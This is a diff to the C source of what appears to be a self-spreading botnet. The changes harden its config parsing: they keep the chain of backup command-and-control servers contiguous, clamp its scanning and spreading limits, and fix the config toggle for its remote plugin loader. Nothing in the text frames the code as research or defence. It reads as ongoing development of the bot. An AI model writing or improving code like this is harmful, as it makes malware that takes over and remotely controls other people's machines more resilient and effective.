@@ -3428,14 +3428,25 @@ int protocol_process_commands(notnet_bot_t *bot) {
                     uint16_t eport = 0;
                     if (c2_rotation_parse_endpoint(value, ehost, sizeof(ehost),
                                                    &eport) == 0) {
-                        snprintf(bot->c2_backup[idx - 1],
-                                 sizeof(bot->c2_backup[0]), "%s", value);
-                        bot->c2_backup_count = 0;
-                        for (int i = 0; i < C2_BACKUP_MAX; i++) {
-                            if (bot->c2_backup[i][0] == '\0') break;
-                            bot->c2_backup_count = (uint8_t)(i + 1);
+                        /* #251: the chain must stay contiguous from
+                         * c2_backup_1 — a gap (e.g. setting c2_backup_3
+                         * with 1..2 unset) would store an endpoint that
+                         * c2_backup() can never reach. Reject instead. */
+                        int contiguous = (idx == 1) ||
+                                         (bot->c2_backup[idx - 2][0] != '\0');
+                        if (!contiguous) {
+                            log_warn("Config: %s rejected — fill c2_backup_%d first "
+                                     "(chain must be contiguous from 1)", key, idx - 1);
+                        } else {
+                            snprintf(bot->c2_backup[idx - 1],
+                                     sizeof(bot->c2_backup[0]), "%s", value);
+                            bot->c2_backup_count = 0;
+                            for (int i = 0; i < C2_BACKUP_MAX; i++) {
+                                if (bot->c2_backup[i][0] == '\0') break;
+                                bot->c2_backup_count = (uint8_t)(i + 1);
+                            }
+                            applied = 1;
                         }
-                        applied = 1;
                     }
                 }
             } else if (strcmp(key, "bot_tag") == 0) {
@@ -4525,7 +4536,11 @@ int load_config(notnet_bot_t *bot, const char *path) {
         } else if (strcmp(key, "telnet_enabled") == 0) {
             bot->telnet_enabled = atoi(value);
         } else if (strcmp(key, "scan_timeout_ms") == 0) {
-            bot->scan_timeout_ms = atoi(value);
+            /* #308: clamp to the same range config_set enforces */
+            int v = atoi(value);
+            if (v < 100) v = 100;
+            if (v > 30000) v = 30000;
+            bot->scan_timeout_ms = v;
         } else if (strcmp(key, "spread_budget_ms") == 0) {
             /* #191: clamp to the same range config_set enforces */
             long v = atol(value);
@@ -4533,9 +4548,15 @@ int load_config(notnet_bot_t *bot, const char *path) {
             if (v > SPREAD_BUDGET_MAX_MS) v = SPREAD_BUDGET_MAX_MS;
             bot->spread_budget_ms = (uint32_t)v;
         } else if (strcmp(key, "scan_max_hosts") == 0) {
-            bot->scan_max_hosts = atoi(value);
+            /* #308: clamp to the same range config_set enforces */
+            int v = atoi(value);
+            if (v < 1) v = 1;
+            if (v > 65535) v = 65535;
+            bot->scan_max_hosts = v;
         } else if (strcmp(key, "heartbeat_interval") == 0) {
-            if (atoi(value) > 0) bot->heartbeat_interval = atoi(value);
+            /* #308: clamp to the same range config_set enforces */
+            int v = atoi(value);
+            if (v >= 1 && v <= 3600) bot->heartbeat_interval = v;
         } else if (strcmp(key, "irc_channel") == 0) {
             strncpy(bot->c2_irc.channel, value, 127);
             bot->c2_irc.channel[127] = '\0';
@@ -4859,9 +4880,11 @@ int load_config(notnet_bot_t *bot, const char *path) {
             } else {
                 log_warn("Config: mesh_operator_pubkey rejected — need 64 hex chars");
             }
-            /* SECURITY FIX (#92): loader/plugin framework toggle. The
-             * built-in plugin registry is bootstrapped at boot and the
-             * `plugin` C2 command dispatches plugins by name. */
+        } else if (strcmp(key, "plugin_enabled") == 0) {
+            /* #306: the loader/plugin framework toggle needs its own
+             * config-file branch — it used to sit inside the
+             * mesh_operator_pubkey block, so plugin_enabled= in a
+             * config file was silently ignored at boot. */
             bot->plugin_enabled = (atoi(value) != 0);
         } else if (strcmp(key, "allow_secret_fallback") == 0) {
             /* #314: opt-in gate for the legacy ?secret= drop-URL
